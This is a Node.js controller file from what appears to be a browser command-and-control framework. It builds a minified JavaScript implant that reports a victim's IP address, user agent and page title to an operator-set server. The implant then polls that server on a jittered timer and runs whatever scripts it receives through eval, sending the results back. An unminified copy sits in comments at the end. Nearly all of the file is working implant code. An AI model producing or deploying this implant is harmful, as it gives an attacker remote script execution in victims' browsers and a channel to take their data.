const Implant = require("../models/Implant");
const Payload = require("../models/Payload");
const { createEvent } = require("./eventControllers");
const { getPayloadById } = require("./payloadControllers");

async function generateImplant(req, res) {

    let { server, initialPayloadId, callbackInterval, minJitter, maxJitter, hostCookie } = req.body;

    // Validate URI for server
    server = server.replace(/\/+$/, "");
    server = server.trim().replace(/\s/g, "");
    if(/^(:\/\/)/.test(server)){
        server = `http${server}`;
    }
    if(!/^(f|ht)tps?:\/\//i.test(server)){
        server = `http://${server}`;
    }

    const templateMin = `let commands=[],data={},id="";function setData(a,t,i){data[a]={value:t,type:i}}async function createHID(){fetch("${server}/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({externalIP:await fetch("https://api.ipify.org/?format=json").then(a=>a.json()).then(a=>a.ip),userAgent:navigator.userAgent,currentTab:document.title,associatedImplant:"%%IMPLANTID%%"})}).then(a=>a.json()).then(responseData=>{if(localStorage.setItem("${hostCookie}",responseData.id),responseData.initialPayload&&""!==responseData.initialPayload.payload)try{eval(responseData.initialPayload.payload),commands.push({id:responseData.initialPayload.id,name:responseData.initialPayload.name,author:"Implant %%IMPLANTID%%",status:"success",data:JSON.stringify(data)})}catch(error){commands.push({id:responseData.initialPayload.id,name:responseData.initialPayload.name,author:"Implant %%IMPLANTID%%",status:"error",data:{message:error.message}})}})}; async function poll(){if(null==localStorage.getItem("${hostCookie}")||void 0==localStorage.getItem("${hostCookie}")||"undefined"==localStorage.getItem("${hostCookie}")?createHID():id=localStorage.getItem("${hostCookie}"),id&&"undefined"!==id)try{await fetch(\`${server}/\${id}\`,{method:"POST",cache:"no-cache",headers:{"Content-Type":"application/json"},body:JSON.stringify({commands:commands})}).then(response=>response.json().then(responseData=>{commands=[],responseData.forEach(payload=>{data={};let script=payload.script;try{script.toUpperCase().includes("ALERT")?setTimeout(function(){eval(script)},1):eval(script),commands.push({id:payload.id,name:payload.name,author:payload.author,status:"success",data:JSON.stringify(data)})}catch(error){commands.push({id:payload.id,name:payload.name,author:payload.author,status:"error",data:{message:error.message}})}})}))}catch(error){localStorage.removeItem("${hostCookie}")}}; !function n(){setTimeout(function(){poll(),n()},${callbackInterval}+(Math.random()*(${maxJitter}-${minJitter})+${minJitter})*(.5>Math.random()?-1:1))}(),poll();`;

    let initialPayloadObject = {name: "", payload: ""}

    if(initialPayloadId !== "" && initialPayloadId !== undefined && initialPayloadId !== "undefined") { 
        const initialPayloadData = await getPayloadById(initialPayloadId);
        initialPayloadObject = {name: initialPayloadData.name, payload: initialPayloadData.payload}
    }

    try {
        const implant = await Implant.create({
            server: server,
            payload: templateMin,
            callbackInterval: callbackInterval,
            minJitter: minJitter,
            maxJitter: maxJitter,
            hostCookie: hostCookie,
            initialPayload: initialPayloadObject
        })
        createEvent("Team Server", `Implant ${implant._id} created`, "info");
        return implant._id.toString();

    } catch (err) {
        return err;
    }
}

async function getImplantById(id) {
    try {
        const implant = await Implant.findById(id);
        return implant.payload;
    } catch (err) {
        return err;
    }
}

async function getAllImplants(req, res) {
    try {
        const implants = await Implant.find();
        res.status(200).json(implants);
    } catch (err) {
        res.status(400).json(err);
    }
}

async function deleteImplantById(req, res) {
    try {
        const implant = await Implant.findByIdAndDelete(req.params.id);
        res.status(200).json(implant);
    } catch (err) {
        res.status(400).json(err);
    }
}


module.exports = {
    generateImplant,
    getImplantById,
    getAllImplants,
    deleteImplantById
};

//     ######### UNMINIFIED IMPLANT #########
//     let commands = [];
//     let data = {};
//     let id = "";

//     function setData(name, value, type) {
//         data[name] = {"value": value, "type": type};
//     }

//     async function createHID() {
//         fetch("${server}/register", {
//             method: "POST",
//             headers: {
//                 "Content-Type": "application/json"
//             },
//             body: JSON.stringify({
//                 "externalIP": await fetch("https://api.ipify.org/?format=json").then((res) => res.json()).then((data) => {return data.ip}),
//                 "userAgent": navigator.userAgent,
//                 "currentTab": document.title,
//                 "associatedImplant": "%%IMPLANTID%%"
//             })
//         }).then(res => res.json()).then(responseData => {
//             localStorage.setItem("${hostCookie}", responseData.id);
//             if(responseData.initialPayload && responseData.initialPayload.payload !== "") {
//                 try {
//                     eval(responseData.initialPayload.payload);
//                     commands.push({
//                         id: responseData.initialPayload.id,
//                         name: responseData.initialPayload.name,
//                         author: "Implant %%IMPLANTID%%",
//                         status: "success",
//                         data: JSON.stringify(data)
//                     });
//                 } catch (error) {
//                     commands.push({
//                         id: responseData.initialPayload.id,
//                         name: responseData.initialPayload.name,
//                         author: "Implant %%IMPLANTID%%",
//                         status: "error",
//                         data: {
//                             message: error.message
//                         }
//                     })
//                 }
                
//             }
//         });
//     }
    
//     async function poll() {
//         if(localStorage.getItem("${hostCookie}") == null || localStorage.getItem("${hostCookie}") == undefined || localStorage.getItem("${hostCookie}") == "undefined") {
//             createHID();
//         } else {
//             id = localStorage.getItem("${hostCookie}");
//         }

//         if (id && id !== "undefined") {
//             try {
//                 await fetch(\`${server}/\${id}\`, {
//                     method: "POST",
//                     cache: "no-cache",
//                     headers: {
//                         "Content-Type": "application/json"
//                     },
//                     body: JSON.stringify({
//                         commands: commands
//                     }),
//                 }).then(response => response.json().then(responseData => {
//                     commands = [];
//                     responseData.forEach((payload) => {
//                         data = {};
//                         const script = payload.script;
//                         try {
//                             if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
//                                 setTimeout(function () {
//                                     eval(script);
//                                 }, 1);
//                             } else {
//                                 eval(script);
//                             }
//                             commands.push({
//                                 id: payload.id,
//                                 name: payload.name,
//                                 author: payload.author,
//                                 status: "success",
//                                 data: JSON.stringify(data)
//                             });
//                         } catch (error) {
//                             commands.push({
//                                 id: payload.id,
//                                 name: payload.name,
//                                 author: payload.author,
//                                 status: "error",
//                                 data: {
//                                     message: error.message
//                                 }
//                             })
//                         }
//                     });
//                 }));
//             } catch (error) {
//                 localStorage.removeItem("${hostCookie}");
//             }
//         }
//     }

//     (function loop() {
//         var interval = ${callbackInterval} + ((Math.random() * (${maxJitter} - ${minJitter}) + ${minJitter}) * (Math.random() < 0.5 ? -1 : 1));
//         setTimeout(function() {
//                 poll();
//                 loop();  
//         }, interval);
//     }());
//     poll();